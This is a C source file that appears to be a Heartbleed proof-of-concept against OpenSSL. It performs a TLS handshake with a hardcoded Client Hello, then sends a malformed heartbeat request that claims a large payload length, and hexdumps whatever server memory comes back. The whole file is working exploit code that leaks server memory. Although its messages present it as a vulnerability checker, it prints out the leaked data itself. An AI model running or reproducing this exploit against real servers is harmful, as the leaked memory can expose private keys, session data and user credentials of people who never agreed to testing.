#include <stdlib.h>
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>

char hello[] =
{
    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53,
    0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf,
    0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00,
    0x00, 0x66, 0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88,
    0x00, 0x87, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c,
    0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09,
    0xc0, 0x1f, 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44,
    0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c,
    0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11,
    0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04,
    0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19,
    0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08,
    0x00, 0x06, 0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13,
    0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00,
    0x00, 0x0f, 0x00, 0x01, 0x01
};

char hb[] =
{
    0x18, 0x03, 0x02, 0x00, 0x03,
    0x01, 0x40, 0x00
};

void hexdump(const void* data, size_t size)
{
    const unsigned char* p = (const unsigned char*) data;
    char hex[16 * 3 + 1];
    char asc[16 + 1];
    size_t i, j;
    for (i = 0; i < size; i += 16) {
        printf("%04zx: ", i);
        for (j = 0; j < 16 && i + j < size; ++j) {
            snprintf(hex + j * 3, sizeof(hex) - j * 3, "%02X ", p[i + j]);
            asc[j] = isprint(p[i + j]) ? p[i + j] : '.';
        }
        asc[j] = '\0';
        printf("%-*s %s\n", 16 * 3, hex, asc);
    }
}


int my_recvmsg(int sockfd, uint8_t * typ_t, uint8_t ** pay_t)
{
    char * hdr_buffer = (char *)malloc(5);

    int hdr_num = recv(sockfd, hdr_buffer, 5, 0);

    if (hdr_num != 5)
    {
        printf("Server closed connection without sending Server Hello.\n");
        return 0;
    }

    uint8_t typ;
    uint16_t ver, ln;

    memcpy(&typ, &hdr_buffer[0], sizeof(uint8_t));
    memcpy(&ver, &hdr_buffer[1], sizeof(uint16_t));
    memcpy(&ln, &hdr_buffer[3], sizeof(uint16_t));

    ver = ntohs(ver);
    ln = ntohs(ln);

    free(hdr_buffer);

    char * pay_buffer = (char *)malloc(ln);

    int pay_num = recv(sockfd, pay_buffer, ln, 0);

    if (pay_num != ln)
    {
        printf("Unexpected EOF receiving record payload - server closed connection\n");
    }

    *typ_t = typ;
    *pay_t = pay_buffer;

    printf(" ... received message: type = %d, ver = %04x, length = %d\n", typ, ver, pay_num);

    return pay_num;
}

int hit_hb(int sockfd)
{
    int n = send(sockfd, hb, 8, 0);

    while (1)
    {
        uint8_t typ; uint8_t * pay;

        int len = my_recvmsg(sockfd, &typ, &pay);

        switch (typ)
        {
        case 0:
            printf("No heartbeat response received, server likely not vulnerable\n");
            free(pay);
            return 0;
            break;

        case 24:
            printf("Received heartbeat response:\n");

            hexdump(pay, len);
            if (len > 3)
            {
                printf("WARNING: server returned more data than it should - server is vulnerable!\n");
            } else
            {
                printf("Server processed malformed heartbeat, but did not return any extra data.\n");
            }
            free(pay);
            return 1;
            break;

        case 21:
            printf("Received alert:\n");

            hexdump(pay, len);
            printf("Server returned error, likely not vulnerable\n");
            free(pay);
            return 0;
            break;

        default:
            break;
        }
    }
}


int main(int argc, char * argv[])
{
    assert(argc == 4);
    int sockfd, n;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        printf("socket error\n");
        exit(1);
    }

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv[3]));

    if (inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0)
    {
        printf("inet_pton error for %s\n", argv[1]);
        exit(1);
    }


    printf("Connect port: %s\n", argv[3]);
    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("connect error\n");
        exit(1);
    }


    printf("Sending Client Hello...\n");
    fflush(stdout);

    n = send(sockfd, hello, 225, 0);

    printf("Waiting for Server Hello...\n");
    fflush(stdout);

    while (1)
    {
        uint8_t typ; uint8_t * pay;

        my_recvmsg(sockfd, &typ, &pay);

        if (typ == 0)
        {
            printf("Server closed connection without sending Server Hello.\n");
            return 0;
        }


        if (typ == 22 && pay[0] == 0x0E)
        {
            free(pay);
            break;
        }

        free(pay);
    }

    printf("Sending heartbeat request...\n");

    fflush(stdout);

    n = send(sockfd, hb, 8, 0);

    hit_hb(sockfd);

    return 0;

}